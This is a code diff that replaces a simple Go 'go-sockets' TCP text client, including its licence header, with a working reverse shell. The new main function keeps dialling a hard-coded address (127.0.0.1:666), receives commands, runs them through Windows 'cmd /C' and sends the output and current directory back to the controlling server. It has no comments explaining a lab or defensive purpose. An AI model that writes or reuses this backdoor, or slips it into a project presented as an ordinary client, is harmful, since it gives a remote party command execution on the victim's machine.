@@ -1,49 +1,84 @@
-// Package main is the entry-point for the go-sockets client sub-project.
-// The go-sockets project is available under the GPL-3.0 License in LICENSE.
 package main
 
 import (
-	"bufio"
-	"fmt"
-	"log"
+	"bytes"
 	"net"
 	"os"
+	"os/exec"
+	"strings"
 )
 
-// Application constants, defining host, port, and protocol.
-const (
-	connHost = "localhost"
-	connPort = "8080"
-	connType = "tcp"
-)
+const address = "127.0.0.1:666"
+const bufferSize = 9999
 
 func main() {
-	// Start the client and connect to the server.
-	fmt.Println("Connecting to", connType, "server", connHost+":"+connPort)
-	conn, err := net.Dial(connType, connHost+":"+connPort)
-	if err != nil {
-		fmt.Println("Error connecting:", err.Error())
-		os.Exit(1)
-	}
 
-	// Create new reader from Stdin.
-	reader := bufio.NewReader(os.Stdin)
+	var server net.Conn
+	var err error
 
-	// run loop forever, until exit.
 	for {
-		// Prompting message.
-		fmt.Print("Text to send: ")
-
-		// Read in input until newline, Enter key.
-		input, _ := reader.ReadString('\n')
-
-		// Send to socket connection.
-		conn.Write([]byte(input))
-
-		// Listen for relay.
-		message, _ := bufio.NewReader(conn).ReadString('\n')
-
-		// Print server relay.
-		log.Print("Server relay: " + message)
+		server, err = net.Dial("tcp", address)
+		if err == nil {
+			break
+		}
 	}
+
+	for {
+		buffer := make([]byte, bufferSize)
+
+		/*
+		 * Read the recv data into the buffer
+		 */
+		n, err := server.Read(buffer)
+
+		if err != nil {
+			os.Exit(1)
+		}
+
+		/**
+		 * Remove non-used bytes
+		 */
+		buffer = bytes.Trim(buffer[:n], "\x00")
+
+		var data []byte
+		data = append(data, buffer...)
+
+		if string(data[:2]) == "cd" {
+			os.Chdir(string(data[3:]))
+		}
+		/**
+		 * Convert the command from []byte to []string
+		 */
+		var cmdArgs []string = strings.Fields(string(data))
+
+		cmdArgs = append([]string{"/C"}, cmdArgs...)
+
+		/**
+		 * Execute the command recieved
+		 */
+		command := exec.Command("cmd", cmdArgs...)
+
+		/**
+		 * Recieve the output
+		 */
+		output, err := command.Output()
+
+		/**
+		 * Send the output to server
+		 */
+
+		if err == nil {
+
+			dir, _ := os.Getwd()
+
+			if len(output) > 0 {
+				server.Write([]byte(dir + ">\n" + string(output)))
+			} else {
+				server.Write([]byte(dir + ">\n" + "Commande exécutée mais pas de réponse"))
+			}
+		} else {
+			server.Write([]byte(err.Error()))
+		}
+	}
+
 }
